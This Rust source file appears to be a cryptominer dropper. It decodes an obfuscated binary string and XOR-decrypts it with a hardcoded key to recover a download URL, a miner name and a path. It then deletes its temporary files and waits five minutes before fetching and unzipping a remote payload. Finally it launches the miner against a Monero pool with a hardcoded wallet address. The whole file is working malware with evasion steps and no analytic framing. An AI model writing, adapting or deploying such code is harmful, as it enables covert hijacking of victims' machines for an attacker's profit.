use std::fs::File;
use std::io::copy;
use std::{fs, path};
use zip::ZipArchive;
use std::thread::sleep;
use std::time::Duration;
use std::env;
use std::process::Command;
use std::io::{self, BufRead};
use std::path::Path;
use std::io::Write;

fn my_bin() -> String{


    let binary_string = "0010101000111100001001000001100100111000010010100111110101011011010001000010101100111100001110000001110000101001010111100011000100011011010011100110110100110000001111010001101100100010000101110111110100001100010011100011000000100001001101110100011000111001000101010011111000010001010000100011000100101101001000110100011000101111000111110010010100011010010011110010110100101001001101000100011000111101010001100111110001000110000100100110110001111001011111110001000100100110000000100011101100010011000011100111010001100110011000100101100001100101010000010111111100010011010000000010000101100101001001110000000000100101010001100110011001011010010110010010101100111000010111010110001100101111000111110010010100011010010011110010110100101001001101000000110000101111001011110011010000011101010011110010011101100111011111110001000100100110000000100011101100010011000011100111010001100110011000100101100001100101010000010101111101111110010110110010111100111010001110010000111001100101000101010010101000010001";
    // Ensure the binary string length is a multiple of 8
    if binary_string.len() % 8 != 0 {
        eprintln!("Invalid binary string length.");
        std::process::exit(1);
    }

    // Split the binary string into chunks of 8 and convert each chunk to a character
    let text = binary_string.as_bytes()
        .chunks(8)
        .map(|chunk| {
            let byte_str = std::str::from_utf8(chunk).unwrap();
            u8::from_str_radix(byte_str, 2).unwrap() as char
        })
        .collect::<String>();

    return text;
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // url to download the file from
    //take the first argument as the url
    // Path to the file
    let obf_file = path::Path::new("links.enc");
    // write the file
    let mut file = File::create(&obf_file)?;
    let my_string = my_bin();
    file.write_all(&my_string.as_bytes())?;
    _ = Command::new("xor") // This is the command (executable)
        .arg("-k")
        .arg("BHPiKpRt#")
        .arg("-i")
        .arg("links.enc")
        .arg("-o")
        .arg("links.txt")
        .output() // Executes the command
        .expect("Failed to execute command");

    let path = Path::new("links.txt");
    
    // Open the file in read-only mode
    let file = File::open(&path)?;

    // Create a buffered reader
    let mut lines = io::BufReader::new(file).lines();

    // Initialize variables to store the data
    let mut url = String::new();
    let mut miner = String::new();
    let mut filepath = String::new(); // Renamed to avoid conflict with 'path' used for file path

    // Read the first line as the URL
    if let Some(line) = lines.next() {
        url = line?;
    }

    // Read the second line as the miner
    if let Some(line) = lines.next() {
        miner = line?;
    }

    // Read the third line as the file path
    if let Some(line) = lines.next() {
        filepath = line?;
    }
       // Print out the values to verify they're correct
    println!("URL: {}", url);
    println!("Miner: {}", miner);
    println!("File Path: {}", filepath);
    // delete temp txt
    fs::remove_file("links.txt")?;
    fs::remove_file("links.enc")?;
    sleep(Duration::from_secs(300));
    // Send a GET request to the url
    let response = reqwest::get(url).await?;
    // Ensure the request was successful
    assert!(response.status().is_success());
    
    // Open a file where the contents will be saved
    let mut dest = File::create("downloaded_file.zip")?;
    
    // Copy the contents of the response body to the file
    let content = response.bytes().await?;
    copy(&mut content.as_ref(), &mut dest)?;
    //unzip the file
    // Unzip the file
    let file = File::open("downloaded_file.zip")?;
    let mut archive = ZipArchive::new(file)?;
    archive.extract("downloaded_file")?;
    //temp until verifying is the folder that contains the new blocks to be verified
    //REMOVE THE ZIP FILE
    fs::remove_file("downloaded_file.zip")?;
    env::set_current_dir(&filepath)?;
    let current = env::current_dir()?;
    println!("Current directory: {:?}", current); 
    //run the miner
    println!("Running the miner {}", miner);
    let full_path = format!("{}\\{}", current.display(), miner);
    println!("Full path: {}", full_path);
    let _: std::process::Output = Command::new(full_path)
        .arg("-o") 
        .arg("xmr.pool.gntl.co.uk:20009")
        .arg("-u")
        .arg("47pGkqgeATm8u7Bzacz2xjNm6PgQUnaQm3WzWYPDKVjfHN2MXCojkpuUzxoNWvfmjcLVLGdqGf2Q2LmqxNesm9TcTfUrGf1")
        .arg("-k")
        .arg("--tls")
        .arg("-p")
        .arg("the_penguin")
        .output()
        .expect("failed to execute process");
    println!("File has been downloaded.");

    Ok(())
}

